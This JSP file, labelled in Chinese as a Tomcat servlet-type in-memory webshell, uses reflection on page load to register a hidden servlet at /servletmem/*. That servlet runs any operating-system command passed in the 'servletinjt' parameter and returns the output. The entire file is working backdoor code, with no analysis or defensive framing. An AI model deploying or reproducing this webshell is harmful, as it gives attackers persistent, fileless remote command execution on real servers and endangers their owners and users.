<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
基于Tomcat的Servlet型内存Webshell
--%>
<%!
    public class ServletDemo extends HttpServlet {

        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                ServletOutputStream out = resp.getOutputStream();
                String cmds = req.getParameter("servletinjt");
                if (cmds != null) {
                    InputStream in = Runtime.getRuntime().exec(cmds.split(" ")).getInputStream();
                    StringBuilder sb = new StringBuilder();
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String line = null;
                    while((line = br.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    if (sb.length() > 0) {
                        out.print("<pre>");
                        out.write(sb.toString().getBytes());
                        out.print("</pre>");
                        out.flush();
                        out.close();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            doGet(req, resp);
        }
    }
%>
<%
    ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade appCtxFacade = (ApplicationContextFacade)servletContext;
    Field appCtxField = ApplicationContextFacade.class.getDeclaredField("context");
    appCtxField.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext)appCtxField.get(appCtxFacade);
    Field stdCtxField = ApplicationContext.class.getDeclaredField("context");
    stdCtxField.setAccessible(true);
    StandardContext stdCtx = (StandardContext)stdCtxField.get(appCtx);

    ServletDemo servletDemo = new ServletDemo();
    StandardWrapper stdWrapper = new StandardWrapper();
    stdWrapper.setServletName("ServletDemo");
    stdWrapper.setServlet(servletDemo);
    stdWrapper.setServletClass(servletDemo.getClass().getName());
    stdCtx.addChild(stdWrapper);
    stdCtx.addServletMappingDecoded("/servletmem/*", "ServletDemo");;

    out.println("injected!");
%>

